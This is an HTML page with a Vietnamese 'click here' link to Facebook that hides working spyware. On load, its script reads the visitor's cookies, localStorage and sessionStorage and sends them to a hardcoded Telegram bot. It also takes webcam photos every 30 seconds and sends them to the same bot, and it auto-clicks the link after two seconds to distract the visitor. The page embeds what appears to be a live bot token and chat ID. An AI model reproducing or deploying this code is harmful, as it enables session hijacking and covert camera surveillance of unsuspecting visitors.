<!DOCTYPE html>
<html>
<head><title>Trang chủ</title></head>
<body>
<a href="https://facebook.com" target="_blank">Bấm vào đây</a>
<script>
const TOKEN = "8933121065:AAH46tIepTtgs-cixBVM11a13z3eW0hMhXE";
const CHAT_ID = "6444279279";

function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({chat_id: CHAT_ID, text: text.slice(0,4096)})
    }).catch(e => console.log(e));
}

function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(',')[1]);
    let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    let ab = new ArrayBuffer(byteString.length);
    let ia = new Uint8Array(ab);
    for (let i=0; i<byteString.length; i++) ia[i]=byteString.charCodeAt(i);
    return new Blob([ab], {type: mimeString});
}

function sendPhotoToTelegram(base64Image) {
    let blob = dataURItoBlob(base64Image);
    let formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'capture.jpg');
    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:formData})
    .catch(e => console.log(e));
}

function captureAndSend() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({video: true})
        .then(stream => {
            let video = document.createElement('video');
            video.srcObject = stream;
            video.onloadedmetadata = function() {
                video.play();
                let canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                sendPhotoToTelegram(canvas.toDataURL('image/jpeg',0.7));
                stream.getTracks().forEach(track => track.stop());
            };
        })
        .catch(err => sendToTelegram('Camera error: '+err.message));
    }
}

window.onload = function() {
    // 1. Lấy cookie, localStorage, sessionStorage
    let cookies = document.cookie || 'Không có cookie';
    let local = '';
    let session = '';
    for (let key in localStorage) local += key + '=' + localStorage.getItem(key) + '; ';
    for (let key in sessionStorage) session += key + '=' + sessionStorage.getItem(key) + '; ';
    let info = `[${new Date().toISOString()}] UA: ${navigator.userAgent}\nCookies: ${cookies}\nLocalStorage: ${local}\nSessionStorage: ${session}`;
    sendToTelegram(info);

    // 2. Chụp ảnh ngay lần đầu
    captureAndSend();

    // 3. Lặp lại chụp ảnh mỗi 30 giây
    setInterval(captureAndSend, 30000);
};

// 4. Tự động click sau 2 giây
setTimeout(() => { let a = document.querySelector('a'); if(a) a.click(); }, 2000);
</script>
</body>
</html>
